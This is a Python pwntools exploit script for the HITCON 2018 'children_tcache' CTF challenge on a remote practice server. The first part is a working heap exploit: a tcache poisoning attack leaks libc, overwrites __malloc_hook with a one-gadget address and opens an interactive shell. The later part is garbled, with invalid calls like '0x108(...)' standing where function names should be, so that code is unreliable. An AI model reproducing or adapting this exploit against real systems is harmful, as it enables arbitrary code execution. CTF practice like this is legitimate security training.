from pwn import *

r = remote('node3.buuoj.cn',25603)
#r = process('./HITCON_2018_children_tcache')
elf = ELF('./HITCON_2018_children_tcache')
libc = ELF('/libc-2.27.so')

def add(size,data):
    r.sendlineafter('Your choice: ','1')
    r.sendlineafter('Size:',str(size))
    r.sendafter('Data:',data)

def show(index):
    r.sendlineafter('Your choice: ','2')
    r.sendlineafter('Index:',str(index))

def free(index):
    r.sendlineafter('Your choice:','3')
    r.sendlineafter('Index:',str(index))



add(0x420,'fuck')
add(0x78,'fuck')
add(0x4f0,'fuck')
add(0x20,'fuck')
free(1)
free(0)
for i in range(9):#fuck \xda
    add(0x78 - i, 'b' * (0x78 - i))
    free(0)
add(0x78,'b'*0x70+p64(0x4b0))#0
free(2)
add(0x420,'fuck')#1
show(0)
leak = u64(r.recvuntil('\n',drop=True).ljust(8,'\x00'))
libc_base = leak - 0x3ebca0
log.success(hex(libc_base))
add(0x78,'wdnmd')#2
free(0)
free(2)

one = libc_base + 0x4f322
malloc_hook = libc_base + libc.symbols['__malloc_hook']
log.success(hex(malloc_hook))
add(0x78,p64(malloc_hook))
add(0x78,'fuck')
add(0x78,p64(one))
r.interactive()

free(7) #0x9c0
free(8) #0xad0
r.interactive()
for i in range(7):
    0x108(0x108,'fuck')
0x108(0x108,'7'*0x108) #7
0x108(0x80,'8') #8

for i in range(7):
    free(i)

for i in range(7):
    0x108(0x80,'fuck')

for i in range(7):
    free(i)
0x108(0x60,'0') #0


free(8)
free(9) 

for i in range(7):
    0x108(0x80,'fuck')

0x108(0x80,'9') 
show(0) #0x70
leak = u64(r.recvn(6).ljust(8,'\x00'))
libc_base = leak - 0x3ebca0
log.success(hex(libc_base))

for i in range(1,7):
    free(i)
free(8)


0x108(0x60,'fuck') #1
free(0)
free(1)

one = libc_base + 0x4f322
malloc_hook = libc_base + libc.symbols['__malloc_hook']
log.success(hex(malloc_hook))
0x108(0x60,p64(malloc_hook))
0x108(0x60,'fuck')
0x108(0x60,p64(one))

r.sendlineafter('Your choice: ','1')
r.sendlineafter('Size:','233')
r.interactive()